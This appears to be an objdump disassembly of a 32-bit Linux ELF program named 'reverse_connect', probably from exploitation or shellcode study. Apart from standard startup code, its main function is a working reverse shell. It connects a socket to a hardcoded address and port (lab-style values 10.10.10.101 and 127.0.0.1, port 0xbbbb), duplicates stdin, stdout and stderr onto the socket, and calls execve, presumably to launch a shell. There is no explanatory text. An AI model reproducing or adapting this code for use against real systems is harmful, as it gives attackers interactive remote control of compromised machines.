
reverse_connect:     file format elf32-i386


Disassembly of section .init:

08048394 <_init>:
 8048394:	53                   	push   %ebx
 8048395:	83 ec 08             	sub    $0x8,%esp
 8048398:	e8 3e 01 00 00       	call   80484db <__x86.get_pc_thunk.bx>
 804839d:	81 c3 63 1c 00 00    	add    $0x1c63,%ebx
 80483a3:	c7 c0 90 84 04 08    	mov    $0x8048490,%eax
 80483a9:	85 c0                	test   %eax,%eax
 80483ab:	74 05                	je     80483b2 <_init+0x1e>
 80483ad:	e8 de 00 00 00       	call   8048490 <__gmon_start__>
 80483b2:	83 c4 08             	add    $0x8,%esp
 80483b5:	5b                   	pop    %ebx
 80483b6:	c3                   	ret    

Disassembly of section .plt:

080483c0 <.plt>:
 80483c0:	ff 35 04 a0 04 08    	pushl  0x804a004
 80483c6:	ff 25 08 a0 04 08    	jmp    *0x804a008
 80483cc:	00 00                	add    %al,(%eax)
	...

080483d0 <dup2@plt>:
 80483d0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80483d6:	68 00 00 00 00       	push   $0x0
 80483db:	e9 e0 ff ff ff       	jmp    80483c0 <.plt>

080483e0 <__monstartup@plt>:
 80483e0:	ff 25 10 a0 04 08    	jmp    *0x804a010
 80483e6:	68 08 00 00 00       	push   $0x8
 80483eb:	e9 d0 ff ff ff       	jmp    80483c0 <.plt>

080483f0 <mcount@plt>:
 80483f0:	ff 25 14 a0 04 08    	jmp    *0x804a014
 80483f6:	68 10 00 00 00       	push   $0x10
 80483fb:	e9 c0 ff ff ff       	jmp    80483c0 <.plt>

08048400 <__cxa_atexit@plt>:
 8048400:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048406:	68 18 00 00 00       	push   $0x18
 804840b:	e9 b0 ff ff ff       	jmp    80483c0 <.plt>

08048410 <__libc_start_main@plt>:
 8048410:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048416:	68 20 00 00 00       	push   $0x20
 804841b:	e9 a0 ff ff ff       	jmp    80483c0 <.plt>

08048420 <execve@plt>:
 8048420:	ff 25 20 a0 04 08    	jmp    *0x804a020
 8048426:	68 28 00 00 00       	push   $0x28
 804842b:	e9 90 ff ff ff       	jmp    80483c0 <.plt>

08048430 <socket@plt>:
 8048430:	ff 25 24 a0 04 08    	jmp    *0x804a024
 8048436:	68 30 00 00 00       	push   $0x30
 804843b:	e9 80 ff ff ff       	jmp    80483c0 <.plt>

08048440 <connect@plt>:
 8048440:	ff 25 28 a0 04 08    	jmp    *0x804a028
 8048446:	68 38 00 00 00       	push   $0x38
 804844b:	e9 70 ff ff ff       	jmp    80483c0 <.plt>

Disassembly of section .text:

08048450 <_start>:
 8048450:	31 ed                	xor    %ebp,%ebp
 8048452:	5e                   	pop    %esi
 8048453:	89 e1                	mov    %esp,%ecx
 8048455:	83 e4 f0             	and    $0xfffffff0,%esp
 8048458:	50                   	push   %eax
 8048459:	54                   	push   %esp
 804845a:	52                   	push   %edx
 804845b:	e8 22 00 00 00       	call   8048482 <_start+0x32>
 8048460:	81 c3 a0 1b 00 00    	add    $0x1ba0,%ebx
 8048466:	8d 83 c0 e6 ff ff    	lea    -0x1940(%ebx),%eax
 804846c:	50                   	push   %eax
 804846d:	8d 83 60 e6 ff ff    	lea    -0x19a0(%ebx),%eax
 8048473:	50                   	push   %eax
 8048474:	51                   	push   %ecx
 8048475:	56                   	push   %esi
 8048476:	ff b3 f8 ff ff ff    	pushl  -0x8(%ebx)
 804847c:	e8 8f ff ff ff       	call   8048410 <__libc_start_main@plt>
 8048481:	f4                   	hlt    
 8048482:	8b 1c 24             	mov    (%esp),%ebx
 8048485:	c3                   	ret    
 8048486:	66 90                	xchg   %ax,%ax
 8048488:	66 90                	xchg   %ax,%ax
 804848a:	66 90                	xchg   %ax,%ax
 804848c:	66 90                	xchg   %ax,%ax
 804848e:	66 90                	xchg   %ax,%ax

08048490 <__gmon_start__>:
 8048490:	53                   	push   %ebx
 8048491:	e8 45 00 00 00       	call   80484db <__x86.get_pc_thunk.bx>
 8048496:	81 c3 6a 1b 00 00    	add    $0x1b6a,%ebx
 804849c:	83 ec 08             	sub    $0x8,%esp
 804849f:	8b 93 30 00 00 00    	mov    0x30(%ebx),%edx
 80484a5:	85 d2                	test   %edx,%edx
 80484a7:	75 2d                	jne    80484d6 <__gmon_start__+0x46>
 80484a9:	83 ec 08             	sub    $0x8,%esp
 80484ac:	ff b3 fc ff ff ff    	pushl  -0x4(%ebx)
 80484b2:	ff b3 f4 ff ff ff    	pushl  -0xc(%ebx)
 80484b8:	c7 83 30 00 00 00 01 	movl   $0x1,0x30(%ebx)
 80484bf:	00 00 00 
 80484c2:	e8 19 ff ff ff       	call   80483e0 <__monstartup@plt>
 80484c7:	58                   	pop    %eax
 80484c8:	ff b3 f0 ff ff ff    	pushl  -0x10(%ebx)
 80484ce:	e8 fd 01 00 00       	call   80486d0 <atexit>
 80484d3:	83 c4 10             	add    $0x10,%esp
 80484d6:	83 c4 08             	add    $0x8,%esp
 80484d9:	5b                   	pop    %ebx
 80484da:	c3                   	ret    

080484db <__x86.get_pc_thunk.bx>:
 80484db:	8b 1c 24             	mov    (%esp),%ebx
 80484de:	c3                   	ret    
 80484df:	90                   	nop

080484e0 <deregister_tm_clones>:
 80484e0:	b8 30 a0 04 08       	mov    $0x804a030,%eax
 80484e5:	3d 30 a0 04 08       	cmp    $0x804a030,%eax
 80484ea:	74 24                	je     8048510 <deregister_tm_clones+0x30>
 80484ec:	b8 00 00 00 00       	mov    $0x0,%eax
 80484f1:	85 c0                	test   %eax,%eax
 80484f3:	74 1b                	je     8048510 <deregister_tm_clones+0x30>
 80484f5:	55                   	push   %ebp
 80484f6:	89 e5                	mov    %esp,%ebp
 80484f8:	83 ec 14             	sub    $0x14,%esp
 80484fb:	68 30 a0 04 08       	push   $0x804a030
 8048500:	ff d0                	call   *%eax
 8048502:	83 c4 10             	add    $0x10,%esp
 8048505:	c9                   	leave  
 8048506:	c3                   	ret    
 8048507:	89 f6                	mov    %esi,%esi
 8048509:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
 8048510:	f3 c3                	repz ret 
 8048512:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8048519:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048520 <register_tm_clones>:
 8048520:	b8 30 a0 04 08       	mov    $0x804a030,%eax
 8048525:	2d 30 a0 04 08       	sub    $0x804a030,%eax
 804852a:	c1 f8 02             	sar    $0x2,%eax
 804852d:	89 c2                	mov    %eax,%edx
 804852f:	c1 ea 1f             	shr    $0x1f,%edx
 8048532:	01 d0                	add    %edx,%eax
 8048534:	d1 f8                	sar    %eax
 8048536:	74 20                	je     8048558 <register_tm_clones+0x38>
 8048538:	ba 00 00 00 00       	mov    $0x0,%edx
 804853d:	85 d2                	test   %edx,%edx
 804853f:	74 17                	je     8048558 <register_tm_clones+0x38>
 8048541:	55                   	push   %ebp
 8048542:	89 e5                	mov    %esp,%ebp
 8048544:	83 ec 10             	sub    $0x10,%esp
 8048547:	50                   	push   %eax
 8048548:	68 30 a0 04 08       	push   $0x804a030
 804854d:	ff d2                	call   *%edx
 804854f:	83 c4 10             	add    $0x10,%esp
 8048552:	c9                   	leave  
 8048553:	c3                   	ret    
 8048554:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8048558:	f3 c3                	repz ret 
 804855a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

08048560 <__do_global_dtors_aux>:
 8048560:	80 3d 34 a0 04 08 00 	cmpb   $0x0,0x804a034
 8048567:	75 17                	jne    8048580 <__do_global_dtors_aux+0x20>
 8048569:	55                   	push   %ebp
 804856a:	89 e5                	mov    %esp,%ebp
 804856c:	83 ec 08             	sub    $0x8,%esp
 804856f:	e8 6c ff ff ff       	call   80484e0 <deregister_tm_clones>
 8048574:	c6 05 34 a0 04 08 01 	movb   $0x1,0x804a034
 804857b:	c9                   	leave  
 804857c:	c3                   	ret    
 804857d:	8d 76 00             	lea    0x0(%esi),%esi
 8048580:	f3 c3                	repz ret 
 8048582:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
 8048589:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi

08048590 <frame_dummy>:
 8048590:	55                   	push   %ebp
 8048591:	89 e5                	mov    %esp,%ebp
 8048593:	5d                   	pop    %ebp
 8048594:	eb 8a                	jmp    8048520 <register_tm_clones>

08048596 <main>:
 8048596:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 804859a:	83 e4 f0             	and    $0xfffffff0,%esp
 804859d:	ff 71 fc             	pushl  -0x4(%ecx)
 80485a0:	55                   	push   %ebp
 80485a1:	89 e5                	mov    %esp,%ebp
 80485a3:	51                   	push   %ecx
 80485a4:	83 ec 24             	sub    $0x24,%esp
 80485a7:	e8 44 fe ff ff       	call   80483f0 <mcount@plt>
 80485ac:	66 c7 45 d8 02 00    	movw   $0x2,-0x28(%ebp)
 80485b2:	c7 45 dc 0a 0a 0a 65 	movl   $0x650a0a0a,-0x24(%ebp)
 80485b9:	c7 45 dc 7f 00 00 01 	movl   $0x100007f,-0x24(%ebp)
 80485c0:	66 c7 45 da bb bb    	movw   $0xbbbb,-0x26(%ebp)
 80485c6:	83 ec 04             	sub    $0x4,%esp
 80485c9:	6a 00                	push   $0x0
 80485cb:	6a 01                	push   $0x1
 80485cd:	6a 02                	push   $0x2
 80485cf:	e8 5c fe ff ff       	call   8048430 <socket@plt>
 80485d4:	83 c4 10             	add    $0x10,%esp
 80485d7:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80485da:	83 ec 04             	sub    $0x4,%esp
 80485dd:	6a 10                	push   $0x10
 80485df:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80485e2:	50                   	push   %eax
 80485e3:	ff 75 f4             	pushl  -0xc(%ebp)
 80485e6:	e8 55 fe ff ff       	call   8048440 <connect@plt>
 80485eb:	83 c4 10             	add    $0x10,%esp
 80485ee:	89 45 f0             	mov    %eax,-0x10(%ebp)
 80485f1:	83 ec 08             	sub    $0x8,%esp
 80485f4:	6a 00                	push   $0x0
 80485f6:	ff 75 f4             	pushl  -0xc(%ebp)
 80485f9:	e8 d2 fd ff ff       	call   80483d0 <dup2@plt>
 80485fe:	83 c4 10             	add    $0x10,%esp
 8048601:	83 ec 08             	sub    $0x8,%esp
 8048604:	6a 01                	push   $0x1
 8048606:	ff 75 f4             	pushl  -0xc(%ebp)
 8048609:	e8 c2 fd ff ff       	call   80483d0 <dup2@plt>
 804860e:	83 c4 10             	add    $0x10,%esp
 8048611:	83 ec 08             	sub    $0x8,%esp
 8048614:	6a 02                	push   $0x2
 8048616:	ff 75 f4             	pushl  -0xc(%ebp)
 8048619:	e8 b2 fd ff ff       	call   80483d0 <dup2@plt>
 804861e:	83 c4 10             	add    $0x10,%esp
 8048621:	c7 45 e8 24 87 04 08 	movl   $0x8048724,-0x18(%ebp)
 8048628:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
 804862f:	8b 45 e8             	mov    -0x18(%ebp),%eax
 8048632:	83 ec 04             	sub    $0x4,%esp
 8048635:	6a 00                	push   $0x0
 8048637:	8d 55 e8             	lea    -0x18(%ebp),%edx
 804863a:	52                   	push   %edx
 804863b:	50                   	push   %eax
 804863c:	e8 df fd ff ff       	call   8048420 <execve@plt>
 8048641:	83 c4 10             	add    $0x10,%esp
 8048644:	b8 00 00 00 00       	mov    $0x0,%eax
 8048649:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 804864c:	c9                   	leave  
 804864d:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048650:	c3                   	ret    
 8048651:	66 90                	xchg   %ax,%ax
 8048653:	66 90                	xchg   %ax,%ax
 8048655:	66 90                	xchg   %ax,%ax
 8048657:	66 90                	xchg   %ax,%ax
 8048659:	66 90                	xchg   %ax,%ax
 804865b:	66 90                	xchg   %ax,%ax
 804865d:	66 90                	xchg   %ax,%ax
 804865f:	90                   	nop

08048660 <__libc_csu_init>:
 8048660:	55                   	push   %ebp
 8048661:	57                   	push   %edi
 8048662:	56                   	push   %esi
 8048663:	53                   	push   %ebx
 8048664:	e8 72 fe ff ff       	call   80484db <__x86.get_pc_thunk.bx>
 8048669:	81 c3 97 19 00 00    	add    $0x1997,%ebx
 804866f:	83 ec 0c             	sub    $0xc,%esp
 8048672:	8b 6c 24 28          	mov    0x28(%esp),%ebp
 8048676:	8d b3 04 ff ff ff    	lea    -0xfc(%ebx),%esi
 804867c:	e8 13 fd ff ff       	call   8048394 <_init>
 8048681:	8d 83 00 ff ff ff    	lea    -0x100(%ebx),%eax
 8048687:	29 c6                	sub    %eax,%esi
 8048689:	c1 fe 02             	sar    $0x2,%esi
 804868c:	85 f6                	test   %esi,%esi
 804868e:	74 25                	je     80486b5 <__libc_csu_init+0x55>
 8048690:	31 ff                	xor    %edi,%edi
 8048692:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048698:	83 ec 04             	sub    $0x4,%esp
 804869b:	55                   	push   %ebp
 804869c:	ff 74 24 2c          	pushl  0x2c(%esp)
 80486a0:	ff 74 24 2c          	pushl  0x2c(%esp)
 80486a4:	ff 94 bb 00 ff ff ff 	call   *-0x100(%ebx,%edi,4)
 80486ab:	83 c7 01             	add    $0x1,%edi
 80486ae:	83 c4 10             	add    $0x10,%esp
 80486b1:	39 fe                	cmp    %edi,%esi
 80486b3:	75 e3                	jne    8048698 <__libc_csu_init+0x38>
 80486b5:	83 c4 0c             	add    $0xc,%esp
 80486b8:	5b                   	pop    %ebx
 80486b9:	5e                   	pop    %esi
 80486ba:	5f                   	pop    %edi
 80486bb:	5d                   	pop    %ebp
 80486bc:	c3                   	ret    
 80486bd:	8d 76 00             	lea    0x0(%esi),%esi

080486c0 <__libc_csu_fini>:
 80486c0:	f3 c3                	repz ret 
 80486c2:	66 90                	xchg   %ax,%ax
 80486c4:	66 90                	xchg   %ax,%ax
 80486c6:	66 90                	xchg   %ax,%ax
 80486c8:	66 90                	xchg   %ax,%ax
 80486ca:	66 90                	xchg   %ax,%ax
 80486cc:	66 90                	xchg   %ax,%ax
 80486ce:	66 90                	xchg   %ax,%ax

080486d0 <atexit>:
 80486d0:	53                   	push   %ebx
 80486d1:	31 c0                	xor    %eax,%eax
 80486d3:	e8 03 fe ff ff       	call   80484db <__x86.get_pc_thunk.bx>
 80486d8:	81 c3 28 19 00 00    	add    $0x1928,%ebx
 80486de:	83 ec 08             	sub    $0x8,%esp
 80486e1:	c7 c2 20 87 04 08    	mov    $0x8048720,%edx
 80486e7:	85 d2                	test   %edx,%edx
 80486e9:	74 02                	je     80486ed <atexit+0x1d>
 80486eb:	8b 02                	mov    (%edx),%eax
 80486ed:	83 ec 04             	sub    $0x4,%esp
 80486f0:	50                   	push   %eax
 80486f1:	6a 00                	push   $0x0
 80486f3:	ff 74 24 1c          	pushl  0x1c(%esp)
 80486f7:	e8 04 fd ff ff       	call   8048400 <__cxa_atexit@plt>
 80486fc:	83 c4 18             	add    $0x18,%esp
 80486ff:	5b                   	pop    %ebx
 8048700:	c3                   	ret    

Disassembly of section .fini:

08048704 <_fini>:
 8048704:	53                   	push   %ebx
 8048705:	83 ec 08             	sub    $0x8,%esp
 8048708:	e8 ce fd ff ff       	call   80484db <__x86.get_pc_thunk.bx>
 804870d:	81 c3 f3 18 00 00    	add    $0x18f3,%ebx
 8048713:	83 c4 08             	add    $0x8,%esp
 8048716:	5b                   	pop    %ebx
 8048717:	c3                   	ret    
